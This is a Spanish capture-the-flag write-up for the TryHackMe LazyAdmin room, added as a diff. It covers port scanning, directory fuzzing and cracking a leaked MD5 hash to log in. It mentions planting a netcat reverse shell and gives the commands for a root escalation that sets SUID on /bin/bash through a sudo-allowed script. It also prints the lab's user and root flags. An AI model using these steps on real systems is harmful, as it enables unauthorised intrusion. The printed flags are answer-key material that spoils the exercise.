@@ -1,0 +1,80 @@
+Tryhackme
+lazyadmin
+
+Nmap:
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.220.70 -oN lazyadmin
+
+Resultado:
+• 22 ssh 7.2
+• 80 http
+
+En el puerto 80 solo hay un servidor Ubuntu. Procedemos a fuzzear.
+
+wfuzz --hc 404 -c -u http://10.10.220.70/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+Resultado:
+• /content
+
+En 10.10.220.70/content no encontramos nada. Procedemos a seguir fuzzear.
+
+wfuzz --hc 404 -c -u http://10.10.217.39/content/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+Resultado:
+• /images
+• /js
+• /inc
+• /as
+• /_themes
+• /attachment
+
+/images: Imágenes (irrelevante)
+/js: Código JS (posible reverseshell)
+/inc: Muchas carpetas (SQL backup)
+
+En SQL backup encontramos lo siguiente:
+• "manager:42f749ade7f9e195bf475f37a44cafcb"
+/as: Panel de inicio de sesión
+/_themes:
+
+Al colocar usuario "manager" y contraseña "42f749ade7f9e195bf475f37a44cafcb" sin resultado, evaluamos la posibilidad de que sea un hash y no la contraseña en sí.
+
+Pasamos el código por "https://crackstation.net/" y, de hecho, nos da un resultado "Password123" en MD5.
+
+Usuario: manager
+Contraseña: Password123
+
+Dentro del login podemos crear archivos en "ads". Haremos un pentestmonkey y desde el puerto 443 utilizando netcat podemos hacer reverseshell.
+
+Dentro de la máquina encontramos la bandera de usuario:
+THM{63e5bce9271952aad1113b6f1ac28a07}
+
+Con el comando "sudo -l" vemos que una ruta tiene privilegios.
+
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+Al entrar y ver "backup.pl" encontramos lo siguiente:
+
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+Por lo tanto, modificaremos el archivo "copy.sh" para poder elevar los privilegios a root.
+
+nano /etc/copy.sh
+
+#!/bin/bash
+
+chmod u+s /bin/bash
+
+Ejecutamos la ruta anteriormente encontrada como sudo.
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+Ejecutamos.
+
+bash -p
+
+Y, de hecho, somos root.
+
+Root:
+THM{6637f41d0177b6f37cb20d775124699f}
